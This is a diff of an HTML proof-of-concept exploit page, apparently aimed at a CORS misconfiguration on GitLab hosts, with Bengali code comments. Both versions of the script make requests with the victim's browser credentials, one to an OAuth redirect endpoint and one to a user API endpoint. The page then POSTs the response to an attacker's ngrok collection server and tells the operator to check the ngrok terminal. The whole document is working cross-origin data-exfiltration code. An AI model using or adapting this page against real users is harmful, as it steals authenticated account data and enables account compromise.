@@ -1,30 +1,27 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <title>CORS PoC - GitLab</title>
-</head>
+<html><head><meta charset="utf-8"/><title>GitLab CORS PoC</title></head>
 <body>
-  <h2>Loading... Please wait</h2>
-
+  <h2>Collecting user info…</h2>
   <script>
-    // ভিক্টিমের ব্রাউজার থেকে GitLab OAuth redirect রেসপন্স নিয়ে তোমার ngrok সার্ভারে পাঠানো হবে
-    fetch("https://projects.gitlab.io/auth?domain=https://docs.gitlab.com&state=iKOkN_x-pvhbvNdNe3Ra1g==", {
+    // ১) GitLab API এ কল করবে, CORS এখানে '*' সেট আছে
+    fetch("https://alerts.gitlab.net/api/v4/user", {
       method: "GET",
       credentials: "include"
     })
-    .then(response => response.text())
-    .then(data => {
-      // তোমার ngrok endpoint এ POST করে পাঠাবে
-      fetch("https://584b8b34f84d.ngrok-free.app", {
+    .then(r => r.json())
+    .then(user => {
+      // ২) সেই ইউজার অবজেক্টকে তোমার ngrok সার্ভারে পাঠাবে
+      return fetch("https://584b8b34f84d.ngrok-free.app/collect", {
         method: "POST",
-        headers: {
-          "Content-Type": "text/plain"
-        },
-        body: data
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(user)
       });
     })
-    .catch(error => {
-      document.body.innerHTML += "<pre>Request failed: " + error + "</pre>";
+    .then(() => {
+      document.body.innerHTML = "<h2>Done! Check your ngrok terminal.</h2>";
+    })
+    .catch(err => {
+      document.body.innerHTML += "<pre>Error: " + err + "</pre>";
     });
   </script>
 </body>
